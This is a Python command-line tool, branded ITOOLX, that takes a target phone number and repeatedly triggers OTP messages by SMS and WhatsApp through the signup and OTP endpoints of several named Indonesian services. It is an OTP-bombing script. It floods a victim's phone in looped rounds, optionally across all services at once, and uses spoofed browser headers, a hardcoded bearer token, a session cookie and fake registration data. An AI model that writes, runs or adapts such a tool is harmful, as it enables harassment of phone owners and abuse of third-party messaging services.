#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import sys
import os
from datetime import datetime

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, IntPrompt
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
    from rich.align import Align
    from rich import box
    from rich.rule import Rule
except ImportError:
    os.system("pip install rich -q")
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, IntPrompt
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
    from rich.align import Align
    from rich import box
    from rich.rule import Rule

console = Console()

# ══════════════════════════════════════════════════════
#  COOLDOWN TRACKER  { phone: { method_key: sent_time } }
# ══════════════════════════════════════════════════════
cooldown_tracker: dict = {}

# ══════════════════════════════════════════════════════
#  BANNER
# ══════════════════════════════════════════════════════
BANNER = """[bold cyan]
 ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗
 ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     ╚██╗██╔╝
 ██║   ██║   ██║   ██║██║   ██║██║      ╚███╔╝ 
 ██║   ██║   ██║   ██║██║   ██║██║      ██╔██╗ 
 ██║   ██║   ╚██████╔╝╚██████╔╝███████╗██╔╝ ██╗
 ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
[/bold cyan]"""

# ══════════════════════════════════════════════════════
#  API CONFIGS
# ══════════════════════════════════════════════════════
APIS = {
    1: {"name": "Bunda.co.id",        "desc": "OTP via SMS",            "icon": "📱", "cooldown": 120, "color": "bright_magenta", "method": "bunda"},
    2: {"name": "OptikMelawai",        "desc": "OTP via Register SMS",   "icon": "👓", "cooldown": 60,  "color": "bright_blue",    "method": "optik"},
    3: {"name": "Paper.id (SMS)",      "desc": "OTP via SMS",            "icon": "📄", "cooldown": 30,  "color": "bright_green",   "method": "paper_sms"},
    4: {"name": "Paper.id (WhatsApp)", "desc": "OTP via WhatsApp",       "icon": "💬", "cooldown": 30,  "color": "bright_yellow",  "method": "paper_wa"},
    5: {"name": "PlanetBan",           "desc": "OTP via WhatsApp",       "icon": "🏪", "cooldown": 60,  "color": "bright_red",     "method": "planetban"},
    6: {"name": "ALL TARGETS",         "desc": "Kirim ke semua API",     "icon": "⚡", "cooldown": 120, "color": "bold cyan",      "method": "all"},
}

UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"

# ══════════════════════════════════════════════════════
#  COOLDOWN HELPERS
# ══════════════════════════════════════════════════════

def get_remaining_cooldown(phone: str, method_key: str, cooldown_sec: int) -> int:
    """Return seconds remaining on cooldown, 0 if clear."""
    sent_at = cooldown_tracker.get(phone, {}).get(method_key)
    if sent_at is None:
        return 0
    elapsed = time.time() - sent_at
    remaining = int(cooldown_sec - elapsed)
    return max(0, remaining)


def set_cooldown(phone: str, method_key: str):
    if phone not in cooldown_tracker:
        cooldown_tracker[phone] = {}
    cooldown_tracker[phone][method_key] = time.time()


def fmt_time(secs: int) -> str:
    m, s = divmod(secs, 60)
    return f"{m}m {s}s" if m else f"{s}s"


# ══════════════════════════════════════════════════════
#  API FUNCTIONS
# ══════════════════════════════════════════════════════

def send_bunda(phone: str) -> dict:
    url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
    headers = {
        "User-Agent": UA, "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json", "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"',
        "x-locale": "id", "sec-ch-ua-mobile": "?1",
        "origin": "https://www.bunda.co.id", "x-requested-with": "com.chimbori.hermitcrab",
        "referer": "https://www.bunda.co.id/id/hospitals", "accept-language": "id-ID,id;q=0.9",
    }
    try:
        r = requests.post(url, data=json.dumps({"phone_number": int(phone), "type": "auth"}), headers=headers, timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}


def send_optik(phone: str) -> dict:
    url = "https://api.optikmelawai.com/api/v3/auth/register/1"
    headers = {
        "User-Agent": UA, "Accept": "application/json, text/plain, */*", "language": "id",
        "sec-ch-ua-platform": '"Android"',
        "authorization": "Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d",
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"',
        "x-unique-user": "GA1.1.883509241.1785170487", "sec-ch-ua-mobile": "?1",
        "origin": "https://optikmelawai.com", "x-requested-with": "com.chimbori.hermitcrab",
        "referer": "https://optikmelawai.com/", "accept-language": "id-ID,id;q=0.9",
        "Cookie": "melawai_session=YJuJgaigHeAbkjFNqgZCzfVj8LZwyFZUjm5ZqntC",
    }
    files = [("name",(None,"Jonuis Dane")),("sex",(None,"1")),("birth_date",(None,"1995-07-28")),
             ("mobile_number",(None,phone)),("password",(None,"Pangkey2005?")),("repassword",(None,"Pangkey2005?"))]
    try:
        r = requests.post(url, files=files, headers=headers, timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}


def send_paper(phone: str, method: str = "sms") -> dict:
    url = "https://register.paper.id/api/v1/auth/register/send-otp"
    headers = {
        "User-Agent": UA, "Content-Type": "application/json",
        "sec-ch-ua-platform": '"Android"', "authorization": "",
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"',
        "x-paper-user-agent": "multiverse/2.58.1 mobile_web (android) chrome",
        "sec-ch-ua-mobile": "?1", "origin": "https://paper.id",
        "x-requested-with": "com.chimbori.hermitcrab", "referer": "https://paper.id/",
        "accept-language": "id-ID,id;q=0.9",
    }
    try:
        r = requests.post(url, data=json.dumps({"phone": phone, "method": method, "registered_by": "flutter mweb"}), headers=headers, timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}


def send_planetban(phone: str) -> dict:
    url = "https://api.planetban.com/website/customer/request-otp"
    num = phone if phone.startswith("62") else "62" + phone.lstrip("0")
    pb_num = "0" + num[2:]
    headers = {
        "User-Agent": UA, "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json", "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"',
        "sec-ch-ua-mobile": "?1", "origin": "https://planetban.com",
        "x-requested-with": "com.chimbori.hermitcrab", "referer": "https://planetban.com/",
        "accept-language": "id-ID,id;q=0.9",
    }
    try:
        r = requests.post(url, data=json.dumps({"phone": pb_num, "purpose": "register", "method": "whatsapp"}), headers=headers, timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}


def dispatch(method: str, phone: str) -> dict:
    if method == "bunda":      return send_bunda(phone)
    if method == "optik":      return send_optik(phone)
    if method == "paper_sms":  return send_paper(phone, "sms")
    if method == "paper_wa":   return send_paper(phone, "whatsapp")
    if method == "planetban":  return send_planetban(phone)
    return {}

# ══════════════════════════════════════════════════════
#  UI HELPERS
# ══════════════════════════════════════════════════════

def status_color(code: int) -> str:
    if code in (200, 201, 202): return "bold green"
    if code == 0: return "bold red"
    if code >= 400: return "bold red"
    return "bold yellow"

def result_icon(code: int) -> str:
    if code in (200, 201, 202): return "✅"
    if code == 0: return "❌"
    return "⚠️"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def validate_phone(raw: str) -> str:
    p = raw.strip().replace(" ", "").replace("-", "")
    if p.startswith("+62"): return "62" + p[3:]
    if p.startswith("08"):  return "628" + p[2:]
    if p.startswith("8"):   return "62" + p
    return p

def print_banner():
    console.print(BANNER)
    console.print(Align.center(Panel(
        "[bold white]Multi-API OTP Sender Tools[/bold white]\n"
        "[dim]by [bold cyan]ITOOLX[/bold cyan] · Termux Edition[/dim]",
        border_style="cyan", padding=(0, 4),
    )))
    console.print()

# ══════════════════════════════════════════════════════
#  COOLDOWN STATUS TABLE  (shown inside menu)
# ══════════════════════════════════════════════════════

def print_cooldown_status(phone: str):
    """Show per-API cooldown status for the current target phone."""
    if not phone or phone not in cooldown_tracker:
        return

    table = Table(
        title=f"[bold yellow]⏱  Status Cooldown  →  {phone}[/bold yellow]",
        box=box.SIMPLE_HEAVY, border_style="yellow",
        header_style="bold yellow", show_lines=False,
    )
    table.add_column("API",      width=22)
    table.add_column("Status",   width=12, justify="center")
    table.add_column("Sisa",     width=10, justify="right")
    table.add_column("Unlock",   width=10, justify="center")

    for api in APIS.values():
        if api["method"] == "all":
            continue
        rem = get_remaining_cooldown(phone, api["method"], api["cooldown"])
        if rem > 0:
            m, s = divmod(rem, 60)
            sisa = f"{m}m {s}s" if m else f"{s}s"
            unlock = datetime.fromtimestamp(
                cooldown_tracker[phone][api["method"]] + api["cooldown"]
            ).strftime("%H:%M:%S")
            row_status = "[bold red]🔒 LOCKED[/bold red]"
        else:
            sisa   = "-"
            unlock = "-"
            row_status = "[bold green]🔓 READY[/bold green]"
        table.add_row(
            f"{api['icon']} {api['name']}",
            row_status, sisa, unlock,
        )

    console.print(Align.center(table))
    console.print()


def print_menu(phone: str = ""):
    table = Table(
        title="[bold cyan]⚡ PILIH TARGET API ⚡[/bold cyan]",
        box=box.DOUBLE_EDGE, border_style="cyan",
        header_style="bold cyan", show_lines=True, min_width=52,
    )
    table.add_column("No",      style="bold white", justify="center", width=4)
    table.add_column("",        justify="center",   width=3)
    table.add_column("Target",  style="bold",       width=22)
    table.add_column("Mode",    width=22)
    table.add_column("⏱",      justify="center",   width=8)

    for num, api in APIS.items():
        # Cooldown badge for single-API rows
        if phone and api["method"] != "all":
            rem = get_remaining_cooldown(phone, api["method"], api["cooldown"])
            cd_txt = (
                f"[bold red]{fmt_time(rem)}[/bold red]"
                if rem > 0
                else f"[bold yellow]{api['cooldown']}s[/bold yellow]"
            )
        else:
            cd_txt = f"[bold yellow]{api['cooldown']}s[/bold yellow]"

        table.add_row(
            f"[bold cyan]{num}[/bold cyan]",
            api["icon"],
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            f"[dim]{api['desc']}[/dim]",
            cd_txt,
        )

    # Exit row
    table.add_row("[bold red]0[/bold red]", "🚪", "[bold red]EXIT[/bold red]", "[dim]Keluar dari program[/dim]", "-")

    console.print(Align.center(table))
    console.print()

# ══════════════════════════════════════════════════════
#  RESULT DISPLAY
# ══════════════════════════════════════════════════════

def print_result_panel(api_name: str, phone: str, result: dict, loop: int, total: int):
    code  = result.get("status", 0)
    body  = result.get("body", "")
    icon  = result_icon(code)
    color = status_color(code)
    preview = body[:120].replace("\n", " ") + ("..." if len(body) > 120 else "")
    console.print(Panel(
        f"[bold white]Target   :[/bold white] [cyan]{api_name}[/cyan]\n"
        f"[bold white]Phone    :[/bold white] [bright_yellow]{phone}[/bright_yellow]\n"
        f"[bold white]HTTP     :[/bold white] [{color}]{code}[/{color}]\n"
        f"[bold white]Round    :[/bold white] [white]{loop}/{total}[/white]\n"
        f"[bold white]Time     :[/bold white] [dim]{datetime.now().strftime('%H:%M:%S')}[/dim]\n"
        f"[bold white]Response :[/bold white] [dim]{preview}[/dim]",
        title=f"[bold]{icon} RESULT[/bold]",
        border_style=color.split()[-1] if "bold" in color else color,
        padding=(1, 2),
    ))


def print_all_results(phone: str, results: list, loop: int, total: int):
    table = Table(
        title=f"[bold cyan]⚡ ALL TARGETS — Round {loop}/{total}[/bold cyan]",
        box=box.ROUNDED, border_style="cyan",
        header_style="bold cyan", show_lines=True,
    )
    table.add_column("",        justify="center", width=3)
    table.add_column("Target",  width=22)
    table.add_column("HTTP",    justify="center", width=6)
    table.add_column("Status",  width=10)
    table.add_column("Jam",     width=10)
    for item in results:
        code = item["status"]
        color = status_color(code)
        icon  = result_icon(code)
        status_text = "SUCCESS" if code in (200,201,202) else ("ERROR" if code == 0 else "FAILED")
        table.add_row(
            item["icon"], f"[bold]{item['name']}[/bold]",
            f"[{color}]{code}[/{color}]",
            f"[{color}]{status_text}[/{color}]",
            f"[dim]{item['time']}[/dim]",
        )
    console.print(Align.center(table))

# ══════════════════════════════════════════════════════
#  COUNTDOWN BAR
# ══════════════════════════════════════════════════════

def countdown(seconds: int, label: str = "Cooldown"):
    with Progress(
        SpinnerColumn(spinner_name="dots", style="bold cyan"),
        TextColumn(f"[bold yellow]{label}"),
        BarColumn(bar_width=28, style="cyan", complete_style="bright_cyan"),
        TextColumn("[bold white]{task.percentage:>3.0f}%"),
        TimeRemainingColumn(),
        console=console, transient=True,
    ) as prog:
        task = prog.add_task("", total=seconds)
        for _ in range(seconds):
            time.sleep(1)
            prog.advance(task, 1)

# ══════════════════════════════════════════════════════
#  SEND RUNNERS
# ══════════════════════════════════════════════════════

def run_single(api_cfg: dict, phone: str, loop_count: int):
    method      = api_cfg["method"]
    cooldown_s  = api_cfg["cooldown"]
    name        = api_cfg["name"]

    for i in range(1, loop_count + 1):
        # Check cooldown before every round
        rem = get_remaining_cooldown(phone, method, cooldown_s)
        if rem > 0:
            console.print(Panel(
                f"[bold white]Nomor    :[/bold white] [bright_yellow]{phone}[/bright_yellow]\n"
                f"[bold white]Target   :[/bold white] [cyan]{name}[/cyan]\n"
                f"[bold white]Sisa     :[/bold white] [bold red]{fmt_time(rem)}[/bold red]\n"
                f"[bold white]Unlock   :[/bold white] [dim]{datetime.fromtimestamp(cooldown_tracker[phone][method] + cooldown_s).strftime('%H:%M:%S')}[/dim]",
                title="[bold red]🔒 COOLDOWN AKTIF[/bold red]",
                border_style="red", padding=(1, 2),
            ))
            pilih = Prompt.ask(
                "[bold cyan]  ❯[/bold cyan] Tunggu cooldown selesai?",
                choices=["y", "n"], default="y",
            )
            if pilih == "n":
                console.print("[bold yellow]  ✗ Pengiriman dibatalkan.[/bold yellow]")
                return
            countdown(rem, f"⏳ Menunggu cooldown  {fmt_time(rem)}")

        console.print(Rule(f"[bold cyan] Round {i}/{loop_count} [/bold cyan]"))
        with console.status(f"[bold cyan]Mengirim ke [bright_yellow]{name}[/bright_yellow]...", spinner="dots"):
            result = dispatch(method, phone)

        set_cooldown(phone, method)
        print_result_panel(name, phone, result, i, loop_count)

        if i < loop_count:
            countdown(cooldown_s, f"⏳ Cooldown  {cooldown_s}s")


def run_all(phone: str, loop_count: int):
    targets     = [v for v in APIS.values() if v["method"] != "all"]
    max_cd      = max(v["cooldown"] for v in targets)

    for i in range(1, loop_count + 1):
        # Check if ANY target is still on cooldown
        locked = [(v, get_remaining_cooldown(phone, v["method"], v["cooldown"])) for v in targets]
        locked = [(v, r) for v, r in locked if r > 0]
        if locked:
            max_rem = max(r for _, r in locked)
            rows = "\n".join(
                f"  {v['icon']} [cyan]{v['name']}[/cyan] → [bold red]{fmt_time(r)}[/bold red]"
                for v, r in locked
            )
            console.print(Panel(
                f"[bold white]Nomor  :[/bold white] [bright_yellow]{phone}[/bright_yellow]\n\n"
                f"{rows}",
                title="[bold red]🔒 BEBERAPA TARGET MASIH COOLDOWN[/bold red]",
                border_style="red", padding=(1, 2),
            ))
            pilih = Prompt.ask(
                "[bold cyan]  ❯[/bold cyan] Tunggu cooldown selesai?",
                choices=["y", "n"], default="y",
            )
            if pilih == "n":
                console.print("[bold yellow]  ✗ Pengiriman dibatalkan.[/bold yellow]")
                return
            countdown(max_rem, f"⏳ Menunggu cooldown  {fmt_time(max_rem)}")

        console.print(Rule(f"[bold cyan] ⚡ ALL TARGETS — Round {i}/{loop_count} [/bold cyan]"))
        results = []
        for api in targets:
            with console.status(f"[bold cyan]Sending → [bright_yellow]{api['name']}[/bright_yellow]...", spinner="aesthetic"):
                t   = datetime.now().strftime("%H:%M:%S")
                res = dispatch(api["method"], phone)
                set_cooldown(phone, api["method"])
                results.append({"name": api["name"], "icon": api["icon"],
                                 "status": res.get("status", 0), "body": res.get("body", ""), "time": t})
            time.sleep(0.3)

        print_all_results(phone, results, i, loop_count)

        if i < loop_count:
            countdown(max_cd, f"⏳ Cooldown  {max_cd}s")

# ══════════════════════════════════════════════════════
#  MAIN LOOP
# ══════════════════════════════════════════════════════

def ask_phone(current: str = "") -> str:
    hint = f" [dim](enter = pakai {current})[/dim]" if current else " [dim](08xxx / 628xxx)[/dim]"
    while True:
        try:
            raw = Prompt.ask(f"[bold cyan]  ❯[/bold cyan] Nomor target{hint}")
            if raw.strip() == "" and current:
                return current
            p = validate_phone(raw)
            if len(p) >= 10:
                return p
            console.print("[bold red]  ✗ Nomor tidak valid![/bold red]")
        except (KeyboardInterrupt, EOFError):
            console.print()
            sys.exit(0)


def main():
    clear()
    print_banner()

    current_phone = ""   # persists across loop iterations

    while True:
        # ── Show cooldown status if phone already set ─────────────────
        if current_phone and current_phone in cooldown_tracker:
            print_cooldown_status(current_phone)

        print_menu(current_phone)

        # ── Pilih API ─────────────────────────────────────────────────
        try:
            raw_choice = Prompt.ask("[bold cyan]  ❯[/bold cyan] Pilih [dim](0 = exit)[/dim]")
            choice = int(raw_choice)
        except (ValueError, KeyboardInterrupt, EOFError):
            console.print("[bold red]  ✗ Input tidak valid.[/bold red]")
            time.sleep(0.8)
            clear()
            print_banner()
            continue

        if choice == 0:
            console.print(Align.center(Panel(
                "[bold red]👋 Sampai jumpa![/bold red]\n[dim]ITOOLX — Termux Edition[/dim]",
                border_style="red", padding=(1, 4),
            )))
            sys.exit(0)

        if choice not in APIS:
            console.print("[bold red]  ✗ Pilihan tidak valid![/bold red]")
            time.sleep(0.8)
            clear()
            print_banner()
            continue

        api_cfg = APIS[choice]
        console.print(f"\n  [bold white]Target  :[/bold white] [{api_cfg['color']}]{api_cfg['icon']} {api_cfg['name']}[/{api_cfg['color']}]")

        # ── Input / konfirmasi nomor ──────────────────────────────────
        current_phone = ask_phone(current_phone)
        console.print(f"  [bold white]Phone   :[/bold white] [bright_yellow]{current_phone}[/bright_yellow]")

        # ── Jumlah round ──────────────────────────────────────────────
        try:
            loop_count = IntPrompt.ask("[bold cyan]  ❯[/bold cyan] Jumlah pengiriman", default=1)
            if loop_count < 1:
                raise ValueError
        except (KeyboardInterrupt, EOFError, ValueError):
            console.print("[bold red]  ✗ Minimal 1![/bold red]")
            time.sleep(0.8)
            clear()
            print_banner()
            continue

        # ── Konfirmasi ────────────────────────────────────────────────
        console.print()
        console.print(Panel(
            f"[bold white]Target  :[/bold white] [{api_cfg['color']}]{api_cfg['icon']} {api_cfg['name']}[/{api_cfg['color']}]\n"
            f"[bold white]Phone   :[/bold white] [bright_yellow]{current_phone}[/bright_yellow]\n"
            f"[bold white]Round   :[/bold white] [white]{loop_count}x[/white]\n"
            f"[bold white]Cooldown:[/bold white] [bold yellow]{api_cfg['cooldown']}s[/bold yellow]",
            title="[bold cyan]📋 KONFIRMASI[/bold cyan]",
            border_style="cyan", padding=(1, 2),
        ))

        try:
            confirm = Prompt.ask("[bold cyan]  ❯[/bold cyan] Lanjut?", choices=["y", "n"], default="y")
        except (KeyboardInterrupt, EOFError):
            confirm = "n"

        if confirm != "y":
            console.print("[bold yellow]  ✗ Dibatalkan. Kembali ke menu...[/bold yellow]")
            time.sleep(0.8)
            clear()
            print_banner()
            continue

        # ── Kirim ─────────────────────────────────────────────────────
        console.print()
        try:
            if api_cfg["method"] == "all":
                run_all(current_phone, loop_count)
            else:
                run_single(api_cfg, current_phone, loop_count)
        except KeyboardInterrupt:
            console.print("\n[bold red]  ✗ Dihentikan. Kembali ke menu...[/bold red]")

        # ── Selesai → kembali ke menu ─────────────────────────────────
        console.print()
        console.print(Align.center(Panel(
            "[bold green]✅ SELESAI![/bold green]  Kembali ke menu...",
            border_style="green", padding=(0, 4),
        )))
        time.sleep(1.5)
        clear()
        print_banner()


if __name__ == "__main__":
    main()
